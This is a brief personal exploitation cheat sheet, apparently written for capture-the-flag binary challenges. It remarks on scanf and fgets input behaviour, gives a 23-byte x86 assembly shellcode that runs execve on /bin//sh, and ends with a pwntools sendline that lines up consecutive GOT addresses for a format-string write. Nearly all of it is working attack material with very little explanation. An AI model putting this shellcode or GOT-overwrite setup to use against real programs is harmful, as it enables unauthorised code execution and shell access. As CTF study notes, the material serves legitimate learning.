### Rusty notes ###

- scanf: terminated after space (be careful)
- fgets: need to fill with exact bytes

- shellcode payload:
payload = ```"""
    xor eax,eax
    push eax
    push 0x68732f2f 
    push 0x6e69622f 
    mov ebx,esp
    push eax
    push ebx
    mov ecx,esp
    mov al,0xb
    int 0x80 
"""```
size = 23 bytes

Too lazy to use format strings in pwntool so:
p.sendline(p32(got_addr)+p32(got_addr+1)+p32(got_addr+2)+p32(got_addr+3)

